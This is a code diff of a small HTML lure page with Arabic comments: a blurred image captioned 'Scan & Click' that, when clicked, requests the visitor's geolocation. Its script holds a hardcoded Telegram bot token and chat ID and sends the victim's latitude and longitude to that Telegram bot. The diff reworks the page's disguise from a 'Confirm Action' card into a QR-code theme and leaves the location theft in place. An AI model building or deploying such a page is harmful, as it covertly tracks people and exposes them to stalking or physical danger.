@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Confirm Action</title>
+  <title>QR Action</title>
   <style>
     body {
       display: flex;
@@ -12,33 +12,33 @@
       height: 100vh;
       background-color: #f0f0f0;
     }
-    #card {
+    #qrCard {
       cursor: pointer;
-      width: 600px; /* تكبير الصورة */
-      height: 400px; /* تكبير الصورة */
+      width: 350px;
+      height: 350px;
       background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
       background-size: cover;
       background-position: center;
-      filter: blur(2px); /* لتغبيش الصورة */
+      filter: blur(3px); /* تغبيش الصورة */
       display: flex;
       justify-content: center;
       align-items: center;
       color: white;
       font-weight: bold;
-      font-size: 24px;
-      text-shadow: 2px 2px 4px black;
+      font-size: 20px;
+      text-shadow: 1px 1px 2px black;
     }
   </style>
 </head>
 <body>
-  <div id="card">Click Here</div>
+  <div id="qrCard">Scan & Click</div>
 
   <script>
-    const card = document.getElementById('card');
+    const qrCard = document.getElementById('qrCard');
     const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
     const CHAT_ID = "7485197107"; // معرف الشات
 
-    card.addEventListener('click', () => {
+    qrCard.addEventListener('click', () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
@@ -46,9 +46,7 @@
 
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
               chat_id: CHAT_ID,
               text: `Lat: ${lat}\nLon: ${lon}`
